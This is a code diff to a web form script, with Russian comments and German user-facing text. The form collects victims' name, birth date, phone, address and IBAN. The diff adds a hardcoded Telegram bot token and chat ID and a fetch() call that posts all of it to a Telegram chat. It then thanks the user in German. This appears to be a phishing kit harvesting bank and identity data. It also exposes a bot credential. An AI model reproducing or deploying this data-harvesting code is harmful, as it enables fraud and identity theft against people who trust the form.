@@ -1,5 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
   
+  // Токен и ID (замените на свои)
+  const BOT_TOKEN = '9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI';
+  const CHAT_ID = '-1003907097706';
+
   // Маска для даты
   const geburtsdatumInput = document.getElementById('geburtsdatum');
   if (geburtsdatumInput) {
@@ -35,18 +39,22 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // Отправка
+  // Отправка через fetch (работает на iPhone)
   const form = document.getElementById('telegramForm');
   
-  form.addEventListener('submit', (e) => {
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
+    const submitBtn = form.querySelector('button[type="submit"]');
+    const originalText = submitBtn.textContent;
+
+    // Сбор данных
     const name = document.getElementById('name').value;
     const geburtsdatum = document.getElementById('geburtsdatum').value;
     const telefon = document.getElementById('telefon').value;
     const adresse = document.getElementById('adresse').value;
-    const plz = document.getElementById('plz').value;
     const stadt = document.getElementById('stadt').value;
+    const plz = document.getElementById('plz').value;
     const iban = document.getElementById('iban').value;
 
     const now = new Date();
@@ -67,15 +75,35 @@ document.addEventListener('DOMContentLoaded', () => {
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
 
-    document.getElementById('telegramText').value = message;
-    
-    // ВАЖНО: form.submit() вызывается СРАЗУ, без setTimeout, чтобы Safari на iOS не блокировал
-    form.submit();
+    submitBtn.textContent = 'Отправка...';
+    submitBtn.disabled = true;
 
-    // А "Спасибо" показываем уже ПОСЛЕ отправки
-    setTimeout(() => {
-      alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
-      form.reset();
-    }, 500);
+    try {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      const data = await response.json();
+
+      if (data.ok) {
+        alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
+        form.reset();
+      } else {
+        throw new Error(data.description || 'Fehler');
+      }
+    } catch (error) {
+      console.error('Ошибка:', error);
+      alert('Fehler beim Senden. Bitte versuchen Sie es später erneut.');
+    } finally {
+      submitBtn.textContent = originalText;
+      submitBtn.disabled = false;
+    }
   });
 });
